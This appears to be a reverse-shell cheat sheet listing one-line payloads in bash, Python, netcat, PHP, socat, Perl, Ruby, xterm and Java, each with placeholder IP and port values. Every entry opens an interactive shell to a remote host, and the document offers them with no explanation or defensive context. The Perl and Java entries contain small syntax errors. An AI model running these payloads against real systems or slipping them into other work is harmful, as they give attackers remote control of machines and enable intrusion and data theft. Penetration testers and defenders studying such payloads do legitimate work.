### BASH:
`$ bash -i >& /dev/tcp/{ip}/{port} 0>&1`
### PYTHON:
`$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
### NETCAT:
`$ nc -e /bin/sh {ip} {port}`
### PHP:
`$ php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'`
### SOCAT:
`$ socat tcp-connect:{ip}:{port} system:/bin/sh`
### PERL:
`$ perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">$S");exec("/bin/sh -i");};'`
### RUBY:
`$ ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
### XTERM:
`$ xterm -display {ip}:{port}`
### JAVA:
`$ r = Runtime.getRuntime()`
`$ p = r.exec(["/bin/bash","-c","exec 5< >/dev/tcp/{ip}/{port};cat <& 5 | while read line; do \$line 2>&5 >&5; done"] as String[])`
`$ p.waitFor()`